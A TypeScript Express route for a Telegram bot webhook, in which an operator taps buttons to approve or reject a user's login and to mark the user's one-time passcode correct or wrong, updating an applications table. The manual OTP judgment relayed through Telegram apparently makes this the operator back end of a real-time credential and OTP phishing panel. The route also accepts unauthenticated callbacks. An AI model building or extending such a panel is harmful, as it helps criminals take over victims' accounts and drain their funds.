/**
 * Telegram Webhook Route
 * Receives callback_query events when admin clicks Approve/Reject/Correct/Wrong
 * Updates the application status in the DB accordingly
 */

import { Router } from "express";
import { eq } from "drizzle-orm";
import { db, applicationsTable } from "@workspace/db";
import { answerTelegramCallback } from "../lib/telegram.js";

const router = Router();

/**
 * POST /api/telegram/webhook
 * Telegram sends all bot updates here (set via setWebhook)
 */
router.post("/telegram/webhook", async (req, res) => {
  // Always respond 200 immediately so Telegram doesn't retry
  res.status(200).json({ ok: true });

  const update = req.body;

  // Only handle callback_query (button presses)
  if (!update?.callback_query) return;

  const callbackQuery = update.callback_query;
  const callbackId = callbackQuery.id;
  const data: string = callbackQuery.data ?? "";

  req.log.info({ data }, "Telegram callback received");

  // Data format: "approve_{sessionId}" | "reject_{sessionId}" | "correct_{sessionId}" | "wrong_{sessionId}"
  const [action, ...rest] = data.split("_");
  const sessionId = rest.join("_");

  if (!sessionId) {
    req.log.warn({ data }, "No sessionId in callback data");
    return;
  }

  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.sessionId, sessionId));

    if (!app) {
      req.log.warn({ sessionId }, "Application not found for callback");
      await answerTelegramCallback(callbackId, "Application not found");
      return;
    }

    if (action === "approve") {
      // Admin approved the login — user can proceed to OTP
      await db
        .update(applicationsTable)
        .set({ status: "LOGIN_APPROVED", updatedAt: new Date() })
        .where(eq(applicationsTable.sessionId, sessionId));

      req.log.info({ sessionId }, "LOGIN APPROVED by admin");
      await answerTelegramCallback(callbackId, "✅ Login Approved — user proceeds to OTP");
    } else if (action === "reject") {
      // Admin rejected the login — user sees rejection message
      await db
        .update(applicationsTable)
        .set({ status: "LOGIN_REJECTED", updatedAt: new Date() })
        .where(eq(applicationsTable.sessionId, sessionId));

      req.log.info({ sessionId }, "LOGIN REJECTED by admin");
      await answerTelegramCallback(callbackId, "❌ Login Rejected");
    } else if (action === "correct") {
      // Admin verified OTP as correct — user reaches success page
      await db
        .update(applicationsTable)
        .set({ status: "OTP_APPROVED", updatedAt: new Date() })
        .where(eq(applicationsTable.sessionId, sessionId));

      req.log.info({ sessionId }, "OTP APPROVED by admin");
      await answerTelegramCallback(callbackId, "✅ OTP Correct — user approved!");
    } else if (action === "wrong") {
      // Admin marked OTP as wrong — user must re-enter
      await db
        .update(applicationsTable)
        .set({ status: "OTP_REJECTED", updatedAt: new Date() })
        .where(eq(applicationsTable.sessionId, sessionId));

      req.log.info({ sessionId }, "OTP REJECTED by admin");
      await answerTelegramCallback(callbackId, "❌ OTP Wrong — user must retry");
    } else {
      req.log.warn({ action, sessionId }, "Unknown callback action");
    }
  } catch (err) {
    req.log.error({ err, sessionId }, "Error processing Telegram callback");
  }
});

export default router;
